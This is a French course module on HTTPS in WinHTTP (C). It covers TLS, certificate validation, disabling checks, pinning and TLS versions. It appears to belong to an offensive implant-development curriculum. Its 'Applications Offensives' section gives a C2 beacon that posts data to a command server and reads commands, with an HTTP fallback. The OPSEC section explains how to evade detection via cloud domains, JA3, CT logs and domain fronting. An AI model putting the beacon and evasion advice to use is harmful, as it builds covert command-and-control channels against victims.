# Module W46 : HTTPS Communication

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre le protocole HTTPS et TLS/SSL
- Implémenter des communications HTTPS sécurisées avec WinHTTP
- Gérer la validation des certificats SSL
- Implémenter le certificate pinning pour renforcer la sécurité
- Contourner ou accepter les certificats auto-signés (pour tests)

## Prérequis

- Module W45 (HTTP Client WinHTTP)
- Compréhension basique de la cryptographie (chiffrement asymétrique)
- Concepts de PKI (Public Key Infrastructure)

## 1. Comprendre HTTPS et TLS

### 1.1 Différence HTTP vs HTTPS

```
HTTP (Port 80)                    HTTPS (Port 443)
─────────────                     ─────────────────

┌─────────────┐                  ┌─────────────┐
│   Client    │                  │   Client    │
└──────┬──────┘                  └──────┬──────┘
       │                                │
       │ GET /data HTTP/1.1             │ [1] ClientHello (TLS)
       │ Cleartext!                     ├──────────────────►
       │                                │ [2] ServerHello + Cert
       ├──────────────────►             ◄──────────────────┤
       │                                │ [3] Key Exchange
       │ 200 OK                         ├──────────────────►
       │ Cleartext response             │ [4] Encrypted data
       ◄──────────────────┤             ├══════════════════►
       │                                │ (AES-256, etc.)
┌──────▼──────┐                  ┌──────▼──────┐
│   Serveur   │                  │   Serveur   │
└─────────────┘                  └─────────────┘

❌ Visible par:                   ✅ Protection:
- Proxy corporatif               - Contenu chiffré
- MITM (attaquant réseau)        - Authentification serveur
- ISP                            - Intégrité des données
```

**Analogie** : HTTP est comme envoyer une carte postale (tout le monde peut lire), HTTPS est comme une lettre dans une enveloppe scellée.

### 1.2 Handshake TLS simplifié

```
Client                                      Serveur
  │                                            │
  │  [1] ClientHello                           │
  │      • Version TLS (1.2, 1.3)              │
  │      • Cipher suites supportées            │
  │      • Random bytes                        │
  ├───────────────────────────────────────────►│
  │                                            │
  │  [2] ServerHello                           │
  │      • Cipher suite choisie                │
  │      • Certificat SSL du serveur           │
  │      • Random bytes                        │
  ◄───────────────────────────────────────────┤
  │                                            │
  │  [3] Validation certificat                 │
  │      • Vérifie signature CA                │
  │      • Vérifie domaine (CN)                │
  │      • Vérifie date validité               │
  │                                            │
  │  [4] Key Exchange                          │
  │      • Génère clé de session               │
  │      • Chiffre avec clé publique serveur   │
  ├───────────────────────────────────────────►│
  │                                            │
  │  [5] Finished (chiffré)                    │
  ├═══════════════════════════════════════════►│
  │                                            │
  │  [6] Application Data (chiffré)            │
  ├═══════════════════════════════════════════►│
  ◄═══════════════════════════════════════════┤
  │                                            │
```

## 2. Requête HTTPS basique avec WinHTTP

### 2.1 Code minimal HTTPS

```c
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

BOOL HttpsGet(LPCWSTR server, LPCWSTR path, PBYTE* response, DWORD* responseSize) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;

    // [1] Créer session
    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) return FALSE;

    // [2] Connecter au serveur sur port HTTPS (443)
    hConnect = WinHttpConnect(
        hSession,
        server,
        INTERNET_DEFAULT_HTTPS_PORT,  // 443 au lieu de 80
        0
    );

    if (!hConnect) goto cleanup;

    // [3] Créer requête avec flag HTTPS
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE  // ← FLAG CRUCIAL pour HTTPS !
    );

    if (!hRequest) goto cleanup;

    // [4] Envoyer requête (WinHTTP gère automatiquement TLS handshake)
    bResults = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0, 0, 0
    );

    if (!bResults) {
        printf("[!] WinHttpSendRequest failed: %d\n", GetLastError());
        goto cleanup;
    }

    // [5] Recevoir réponse
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) goto cleanup;

    // [6] Lire données (même code que HTTP)
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    PBYTE pBuffer = NULL;
    DWORD totalSize = 0;

    do {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
        if (dwSize == 0) break;

        PBYTE tempBuffer = (PBYTE)malloc(dwSize + 1);
        if (!tempBuffer) break;

        ZeroMemory(tempBuffer, dwSize + 1);

        if (!WinHttpReadData(hRequest, tempBuffer, dwSize, &dwDownloaded)) {
            free(tempBuffer);
            break;
        }

        PBYTE newBuffer = (PBYTE)realloc(pBuffer, totalSize + dwDownloaded + 1);
        if (!newBuffer) {
            free(tempBuffer);
            break;
        }
        pBuffer = newBuffer;
        memcpy(pBuffer + totalSize, tempBuffer, dwDownloaded);
        totalSize += dwDownloaded;
        pBuffer[totalSize] = '\0';

        free(tempBuffer);

    } while (dwSize > 0);

    *response = pBuffer;
    *responseSize = totalSize;
    bResults = TRUE;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return bResults;
}

int main() {
    PBYTE response = NULL;
    DWORD responseSize = 0;

    if (HttpsGet(L"www.google.com", L"/", &response, &responseSize)) {
        printf("[+] HTTPS GET Success: %d bytes\n", responseSize);
        free(response);
    } else {
        printf("[!] HTTPS GET failed\n");
    }

    return 0;
}
```

### 2.2 Points clés HTTPS

**3 changements par rapport à HTTP** :
```c
// [1] Port 443 au lieu de 80
WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTPS_PORT, 0);

// [2] Flag WINHTTP_FLAG_SECURE
WinHttpOpenRequest(..., WINHTTP_FLAG_SECURE);

// [3] WinHTTP gère automatiquement:
//     - TLS handshake
//     - Validation certificat
//     - Chiffrement/déchiffrement
```

## 3. Validation des certificats SSL

### 3.1 Chaîne de confiance

```
┌────────────────────────────────────────────┐
│  Root CA (Certificate Authority)          │
│  Ex: DigiCert Global Root CA              │
│  • Stocké dans Windows Trust Store        │
│  • Clé publique connue du système         │
└────────────┬───────────────────────────────┘
             │ Signe avec sa clé privée
             ▼
┌────────────────────────────────────────────┐
│  Intermediate CA                           │
│  Ex: DigiCert SHA2 Secure Server CA       │
└────────────┬───────────────────────────────┘
             │ Signe avec sa clé privée
             ▼
┌────────────────────────────────────────────┐
│  Certificat du serveur                     │
│  CN (Common Name): www.example.com         │
│  • Clé publique du serveur                 │
│  • Validité: 2024-01-01 → 2025-01-01      │
│  • Signature de l'Intermediate CA          │
└────────────────────────────────────────────┘

Validation par WinHTTP:
[✓] Signature valide ? (vérif crypto)
[✓] CA de confiance ? (dans Windows store)
[✓] Date valide ? (pas expiré)
[✓] Domaine correspond ? (CN == hostname)
[✓] Pas révoqué ? (CRL/OCSP check)
```

### 3.2 Récupérer informations du certificat

```c
BOOL DisplayCertificateInfo(HINTERNET hRequest) {
    WINHTTP_CERTIFICATE_INFO certInfo;
    DWORD dwSize = sizeof(certInfo);

    // Récupérer infos certificat
    if (!WinHttpQueryOption(
            hRequest,
            WINHTTP_OPTION_SECURITY_CERTIFICATE_STRUCT,
            &certInfo,
            &dwSize)) {
        printf("[!] Failed to get cert info: %d\n", GetLastError());
        return FALSE;
    }

    // Afficher Subject (CN)
    printf("[+] Certificate Subject: %s\n", certInfo.lpszSubjectInfo);

    // Afficher Issuer (CA)
    printf("[+] Certificate Issuer: %s\n", certInfo.lpszIssuerInfo);

    // Afficher période de validité
    SYSTEMTIME notBefore, notAfter;
    FileTimeToSystemTime(&certInfo.ftStart, &notBefore);
    FileTimeToSystemTime(&certInfo.ftExpiry, &notAfter);

    printf("[+] Valid from: %02d/%02d/%d\n",
           notBefore.wDay, notBefore.wMonth, notBefore.wYear);
    printf("[+] Valid until: %02d/%02d/%d\n",
           notAfter.wDay, notAfter.wMonth, notAfter.wYear);

    // Libérer mémoire allouée
    if (certInfo.lpszSubjectInfo)
        LocalFree(certInfo.lpszSubjectInfo);
    if (certInfo.lpszIssuerInfo)
        LocalFree(certInfo.lpszIssuerInfo);
    if (certInfo.lpszProtocolName)
        LocalFree(certInfo.lpszProtocolName);
    if (certInfo.lpszSignatureAlgName)
        LocalFree(certInfo.lpszSignatureAlgName);
    if (certInfo.lpszEncryptionAlgName)
        LocalFree(certInfo.lpszEncryptionAlgName);

    return TRUE;
}

// Utilisation après WinHttpReceiveResponse()
if (WinHttpReceiveResponse(hRequest, NULL)) {
    DisplayCertificateInfo(hRequest);
    // ... lire données
}
```

## 4. Accepter certificats invalides (DANGER!)

### 4.1 Pourquoi désactiver la validation ?

**Cas d'usage légitime** :
- Tests en environnement de développement
- Serveurs C2 avec certificats auto-signés
- Labs de test internes

**ATTENTION** : Ne JAMAIS désactiver en production sans raison valable !

### 4.2 Code pour ignorer erreurs certificat

```c
BOOL HttpsGetInsecure(LPCWSTR server, LPCWSTR path) {
    HINTERNET hSession, hConnect, hRequest;
    BOOL bResults = FALSE;

    hSession = WinHttpOpen(L"Mozilla/5.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);

    hConnect = WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTPS_PORT, 0);

    hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);

    // Désactiver TOUTES les validations SSL (DANGEREUX!)
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |          // CA non reconnue
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |   // Certificat expiré
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |     // CN ne correspond pas
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;     // Usage incorrect

    WinHttpSetOption(
        hRequest,
        WINHTTP_OPTION_SECURITY_FLAGS,
        &dwFlags,
        sizeof(dwFlags)
    );

    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
                                  0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
        printf("[+] Connected to %S (cert validation DISABLED)\n", server);
        // ... lire réponse
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return bResults;
}
```

### 4.3 Flags de sécurité disponibles

```c
// Ignorer CA inconnue (certificat auto-signé)
SECURITY_FLAG_IGNORE_UNKNOWN_CA

// Ignorer certificat expiré
SECURITY_FLAG_IGNORE_CERT_DATE_INVALID

// Ignorer mismatch CN (Common Name)
// Ex: cert pour "example.com" mais connexion à "192.168.1.1"
SECURITY_FLAG_IGNORE_CERT_CN_INVALID

// Ignorer usage incorrect du certificat
SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE

// Ignorer révocation (CRL/OCSP non disponible)
SECURITY_FLAG_IGNORE_REVOCATION
```

## 5. Certificate Pinning

### 5.1 Concept

Le **Certificate Pinning** consiste à valider qu'un serveur présente exactement le certificat attendu, même s'il est signé par une CA de confiance.

**Pourquoi ?** : Protection contre :
- MITM avec certificats valides (proxy SSL inspection)
- Certificats frauduleux émis par CA compromise
- Attaques sur la PKI

```
Sans pinning:                Avec pinning:
──────────────               ─────────────

[Client] → [Proxy MITM]      [Client] → [Proxy MITM]
           (Cert valide CA)             (Cert différent!)
           ↓                            ↓
           ✅ Accepté                   ❌ REJETÉ
           ↓                            (Hash ne correspond pas)
        [Serveur C2]
```

### 5.2 Implémentation pinning par hash

```c
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

// Hash SHA256 du certificat attendu (à calculer au préalable)
const BYTE EXPECTED_CERT_HASH[] = {
    0x4a, 0x6f, 0x3e, 0x9c, 0x1b, 0x2d, 0x8f, 0x7a,
    0xe3, 0x45, 0xb6, 0xd7, 0x92, 0x1f, 0x8e, 0x4c,
    0x3a, 0x5b, 0x9d, 0x2e, 0x7f, 0x1c, 0x6a, 0x8b,
    0xf4, 0x0d, 0xc5, 0xa3, 0x7e, 0x2b, 0x9f, 0x6d
};

BOOL VerifyCertificatePin(HINTERNET hRequest) {
    PCCERT_CONTEXT pCertContext = NULL;
    DWORD dwSize = sizeof(pCertContext);
    BOOL bPinValid = FALSE;

    // Récupérer le certificat du serveur
    if (!WinHttpQueryOption(
            hRequest,
            WINHTTP_OPTION_SERVER_CERT_CONTEXT,
            &pCertContext,
            &dwSize)) {
        printf("[!] Failed to get cert context: %d\n", GetLastError());
        return FALSE;
    }

    // Calculer hash SHA256 du certificat
    BYTE certHash[32];  // SHA256 = 32 bytes
    DWORD hashSize = sizeof(certHash);

    if (!CryptHashCertificate(
            0,                              // hCryptProv (NULL = default)
            CALG_SHA_256,                   // Algorithme SHA256
            0,                              // dwFlags
            pCertContext->pbCertEncoded,    // Données du certificat
            pCertContext->cbCertEncoded,    // Taille
            certHash,                       // Output
            &hashSize)) {
        printf("[!] CryptHashCertificate failed: %d\n", GetLastError());
        CertFreeCertificateContext(pCertContext);
        return FALSE;
    }

    // Comparer avec le hash attendu
    if (memcmp(certHash, EXPECTED_CERT_HASH, sizeof(certHash)) == 0) {
        printf("[+] Certificate pinning: VALID\n");
        bPinValid = TRUE;
    } else {
        printf("[!] Certificate pinning: INVALID (possible MITM!)\n");
        printf("[!] Expected hash: ");
        for (int i = 0; i < 32; i++) printf("%02x", EXPECTED_CERT_HASH[i]);
        printf("\n[!] Received hash: ");
        for (int i = 0; i < 32; i++) printf("%02x", certHash[i]);
        printf("\n");
        bPinValid = FALSE;
    }

    CertFreeCertificateContext(pCertContext);
    return bPinValid;
}

// Utilisation dans requête HTTPS
BOOL HttpsGetWithPinning(LPCWSTR server, LPCWSTR path) {
    HINTERNET hSession, hConnect, hRequest;
    BOOL bResults = FALSE;

    hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    hConnect = WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTPS_PORT, 0);
    hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);

    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
                                  0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    if (!bResults) goto cleanup;

    bResults = WinHttpReceiveResponse(hRequest, NULL);

    if (bResults) {
        // VÉRIFIER LE PIN AVANT DE TRAITER LES DONNÉES !
        if (!VerifyCertificatePin(hRequest)) {
            printf("[!] Certificate pin mismatch, aborting!\n");
            bResults = FALSE;
            goto cleanup;
        }

        printf("[+] Certificate pinning passed, safe to continue\n");
        // ... lire données
    }

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return bResults;
}
```

### 5.3 Calculer le hash d'un certificat

```c
// Utilitaire pour calculer le hash d'un certificat
void PrintCertificateHash(HINTERNET hRequest) {
    PCCERT_CONTEXT pCertContext = NULL;
    DWORD dwSize = sizeof(pCertContext);

    if (!WinHttpQueryOption(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT,
                            &pCertContext, &dwSize)) {
        return;
    }

    BYTE certHash[32];
    DWORD hashSize = sizeof(certHash);

    if (CryptHashCertificate(0, CALG_SHA_256, 0,
                             pCertContext->pbCertEncoded,
                             pCertContext->cbCertEncoded,
                             certHash, &hashSize)) {
        printf("[+] Certificate SHA256 hash:\n");
        printf("const BYTE EXPECTED_CERT_HASH[] = {\n    ");
        for (DWORD i = 0; i < hashSize; i++) {
            printf("0x%02x", certHash[i]);
            if (i < hashSize - 1) printf(", ");
            if ((i + 1) % 8 == 0 && i < hashSize - 1) printf("\n    ");
        }
        printf("\n};\n");
    }

    CertFreeCertificateContext(pCertContext);
}
```

## 6. Pinning par clé publique

### 6.1 Avantage du Public Key Pinning

Au lieu de valider le certificat entier (qui change régulièrement), on valide uniquement la clé publique (qui reste stable).

```
Certificat complet:          Clé publique seulement:
───────────────────          ───────────────────────
• Change chaque année        • Stable plusieurs années
• Include metadata           • Partie crypto essentielle
• Expire                     • Indépendant de l'expiration
```

### 6.2 Implémentation

```c
const BYTE EXPECTED_PUBLIC_KEY_HASH[] = {
    // Hash SHA256 de la clé publique
    0x3f, 0x7a, 0x89, 0xbc, 0x45, 0xd1, 0x8e, 0x2f,
    // ... (32 bytes total)
};

BOOL VerifyPublicKeyPin(HINTERNET hRequest) {
    PCCERT_CONTEXT pCertContext = NULL;
    DWORD dwSize = sizeof(pCertContext);

    if (!WinHttpQueryOption(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT,
                            &pCertContext, &dwSize)) {
        return FALSE;
    }

    // Extraire la clé publique du certificat
    PCERT_PUBLIC_KEY_INFO pPublicKeyInfo = &pCertContext->pCertInfo->SubjectPublicKeyInfo;

    // Calculer hash de la clé publique
    BYTE pubKeyHash[32];
    DWORD hashSize = sizeof(pubKeyHash);

    BOOL result = CryptHashCertificate(
        0,
        CALG_SHA_256,
        0,
        pPublicKeyInfo->PublicKey.pbData,
        pPublicKeyInfo->PublicKey.cbData,
        pubKeyHash,
        &hashSize
    );

    CertFreeCertificateContext(pCertContext);

    if (!result) return FALSE;

    // Comparer avec le hash attendu
    return (memcmp(pubKeyHash, EXPECTED_PUBLIC_KEY_HASH, 32) == 0);
}
```

## 7. Versions TLS et Cipher Suites

### 7.1 Forcer TLS 1.2 minimum

```c
BOOL HttpsGetTLS12(LPCWSTR server, LPCWSTR path) {
    HINTERNET hSession, hConnect, hRequest;

    hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    // Forcer TLS 1.2 minimum (désactiver SSLv3, TLS 1.0, TLS 1.1)
    DWORD dwProtocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 |
                        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;

    WinHttpSetOption(
        hSession,
        WINHTTP_OPTION_SECURE_PROTOCOLS,
        &dwProtocols,
        sizeof(dwProtocols)
    );

    hConnect = WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTPS_PORT, 0);
    hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);

    // ... suite du code
    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
                       0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    // Cleanup
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return TRUE;
}
```

### 7.2 Afficher version TLS utilisée

```c
void DisplayTLSVersion(HINTERNET hRequest) {
    WINHTTP_SECURITY_INFO securityInfo;
    DWORD dwSize = sizeof(securityInfo);

    if (WinHttpQueryOption(hRequest, WINHTTP_OPTION_SECURITY_INFO,
                           &securityInfo, &dwSize)) {
        printf("[+] Cipher strength: %d bits\n", securityInfo.ConnectionInfo.dwCipherStrength);
        printf("[+] Hash strength: %d bits\n", securityInfo.ConnectionInfo.dwHashStrength);

        // Protocole utilisé
        switch (securityInfo.ConnectionInfo.dwProtocol) {
            case SP_PROT_TLS1_CLIENT:
                printf("[+] Protocol: TLS 1.0\n");
                break;
            case SP_PROT_TLS1_1_CLIENT:
                printf("[+] Protocol: TLS 1.1\n");
                break;
            case SP_PROT_TLS1_2_CLIENT:
                printf("[+] Protocol: TLS 1.2\n");
                break;
            case SP_PROT_TLS1_3_CLIENT:
                printf("[+] Protocol: TLS 1.3\n");
                break;
            default:
                printf("[+] Protocol: Unknown\n");
        }
    }
}
```

## 8. Applications Offensives

### 8.1 Beacon HTTPS avec pinning

```c
typedef struct {
    WCHAR server[256];
    WCHAR path[256];
    BYTE certHash[32];
    DWORD interval;
} C2_CONFIG;

BOOL SecureBeacon(C2_CONFIG* config, LPVOID beaconData, DWORD dataSize) {
    HINTERNET hSession, hConnect, hRequest;
    BOOL bSuccess = FALSE;

    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);

    // Forcer TLS 1.2+
    DWORD dwProtocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 |
                        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS,
                     &dwProtocols, sizeof(dwProtocols));

    hConnect = WinHttpConnect(hSession, config->server,
                             INTERNET_DEFAULT_HTTPS_PORT, 0);

    hRequest = WinHttpOpenRequest(hConnect, L"POST", config->path, NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);

    // Envoyer requête
    if (WinHttpSendRequest(hRequest, L"Content-Type: application/octet-stream\r\n",
                           -1L, beaconData, dataSize, dataSize, 0)) {

        if (WinHttpReceiveResponse(hRequest, NULL)) {
            // VÉRIFIER PINNING
            PCCERT_CONTEXT pCert = NULL;
            DWORD dwSize = sizeof(pCert);

            if (WinHttpQueryOption(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT,
                                   &pCert, &dwSize)) {
                BYTE certHash[32];
                DWORD hashSize = sizeof(certHash);

                if (CryptHashCertificate(0, CALG_SHA_256, 0,
                                         pCert->pbCertEncoded,
                                         pCert->cbCertEncoded,
                                         certHash, &hashSize)) {
                    if (memcmp(certHash, config->certHash, 32) == 0) {
                        printf("[+] Certificate pinning validated\n");
                        bSuccess = TRUE;
                        // ... lire commandes C2
                    } else {
                        printf("[!] Certificate mismatch - MITM detected!\n");
                    }
                }
                CertFreeCertificateContext(pCert);
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return bSuccess;
}
```

### 8.2 Fallback HTTP si HTTPS échoue

```c
BOOL FlexibleBeacon(LPCWSTR server, LPCWSTR path, BOOL tryHttps) {
    PBYTE response = NULL;
    DWORD responseSize = 0;
    BOOL result = FALSE;

    if (tryHttps) {
        printf("[*] Attempting HTTPS connection...\n");
        result = HttpsGet(server, path, &response, &responseSize);

        if (!result) {
            printf("[!] HTTPS failed, falling back to HTTP\n");
            // Fallback vers HTTP (moins secure mais fonctionne)
            result = HttpGet(server, path, &response, &responseSize);
        }
    } else {
        result = HttpGet(server, path, &response, &responseSize);
    }

    if (result && response) {
        // Traiter réponse
        free(response);
    }

    return result;
}
```

## 9. Considérations OPSEC

### 9.1 Détection HTTPS

**Bonnes pratiques** :
```
[✓] Utiliser des domaines légitimes (cloudfront, azure, etc.)
[✓] Certificats valides signés par CA reconnue
[✓] TLS 1.2+ (éviter versions obsolètes)
[✓] SNI (Server Name Indication) correct
[✓] Cipher suites modernes
[✓] Pas de certificats auto-signés en production
```

**Mauvaises pratiques détectables** :
```
[X] Certificats auto-signés
[X] CN (Common Name) suspect (ex: "malware.local")
[X] Connexions à IPs directes (pas de domaine)
[X] TLS 1.0 ou SSLv3 (obsolètes)
[X] Port non-standard (ex: 8443, 9443)
```

### 9.2 JA3 Fingerprinting

JA3 est un hash du ClientHello TLS permettant d'identifier un client.

```
JA3 Hash = MD5(
    TLS Version,
    Cipher Suites,
    Extensions,
    Elliptic Curves,
    EC Point Formats
)

Exemple:
Chrome:  769,47-53-5-10-49161-49162...
Firefox: 769,49-48-53-5-10-49162...
Custom:  771,1-2-3-4-5...  ← SUSPECT!
```

**Mitigation** : WinHTTP utilise les paramètres TLS du système Windows, donc le JA3 ressemble à celui d'applications légitimes Windows.

### 9.3 Certificate Transparency Logs

Les certificats publics sont enregistrés dans des logs publics (CT Logs). Un certificat pour `malicious-c2.com` sera visible !

**Solutions** :
- Utiliser domain fronting (module W50)
- Certificats pour domaines légitimes (cloud providers)
- Pas de certificats publics pour infrastructures internes

## 10. Checklist HTTPS sécurisé

- [ ] Port 443 (INTERNET_DEFAULT_HTTPS_PORT)
- [ ] Flag WINHTTP_FLAG_SECURE activé
- [ ] TLS 1.2+ minimum (pas de TLS 1.0/1.1/SSLv3)
- [ ] Validation certificat activée (sauf tests)
- [ ] Certificate pinning implémenté pour C2 critiques
- [ ] Gestion erreurs TLS (handshake failures)
- [ ] User-Agent légitime
- [ ] SNI correct (correspond au CN du certificat)
- [ ] Timeout configurés
- [ ] Logs désactivés en production

## 11. Compilation

```bash
# Avec cl.exe
cl.exe /O2 https_client.c /link winhttp.lib crypt32.lib

# Avec MinGW
gcc https_client.c -o https_client.exe -lwinhttp -lcrypt32 -O2
```

## Exercices

Voir [exercice.md](exercice.md) pour :
- Implémenter client HTTPS avec validation complète
- Calculer et vérifier certificate pinning
- Créer beacon HTTPS avec fallback HTTP
- Tester avec certificats auto-signés

## Ressources complémentaires

- [Microsoft WinHTTP SSL Documentation](https://docs.microsoft.com/en-us/windows/win32/winhttp/ssl-in-winhttp)
- [OWASP Certificate Pinning](https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning)
- [RFC 8446 - TLS 1.3](https://datatracker.ietf.org/doc/html/rfc8446)
- [JA3 Fingerprinting](https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967)

---

**Navigation**
- [Module précédent](../W45_http_client_winhttp/)
- [Module suivant](../W47_wininet_client/)
